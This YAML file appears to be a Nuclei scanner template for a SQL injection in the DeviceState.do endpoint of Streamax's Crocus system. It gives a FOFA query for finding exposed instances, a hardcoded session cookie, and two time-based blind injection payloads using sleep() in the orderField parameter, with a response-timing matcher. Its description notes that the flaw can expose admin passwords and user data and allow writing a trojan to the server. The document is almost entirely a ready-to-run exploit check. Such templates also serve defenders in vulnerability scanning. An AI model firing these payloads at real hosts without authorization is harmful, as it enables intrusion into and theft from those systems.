id: Crocus-DeviceState-SQL

info:
  name: 锐明Crocus DeviceState SQL注入
  author: HuanXiong
  severity: high
  description: |-
    fofa: body="window.registerLogin.changeAuthCode" || body="inp_verification"
    锐明技术Crocus系统 DeviceState.do 接口存在SQL注入漏洞，经过身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
  reference:
    - 
  tags: SQL Injection

http:
  - raw:
      - |
        POST /DeviceState.do?Action=Query HTTP/1.1
        Host: {{Hostname}}
        Accept-Encoding: gzip
        Connection: close
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
        Cookie: Saffron.U=VUlEPTEmVU49c3RyZWFtYXgyMDAyMDgxOCZHSUQ9MTcyNDI5Mjg4ODgyMC41MTQ3OSZSSUQ9MSZNPUJNYXAmSU5TPTE=
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36

        PageSize=1&PageIndex=0&orderField=(select*from(select%20sleep(4))a)

      - |
        POST /DeviceState.do?Action=Query HTTP/1.1
        Host: {{Hostname}}
        Accept-Encoding: gzip
        Connection: close
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
        Cookie: Saffron.U=VUlEPTEmVU49c3RyZWFtYXgyMDAyMDgxOCZHSUQ9MTcyNDI5Mjg4ODgyMC41MTQ3OSZSSUQ9MSZNPUJNYXAmSU5TPTE=
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36

        PageSize=1&PageIndex=0&orderField=(select*from(select%20sleep(8))a)

    matchers:
      - type: dsl
        name: SQL注入
        dsl:
          - "status_code==200 && duration_1>=4 && duration_1<=5 && duration_2>=8 && duration_2<=9"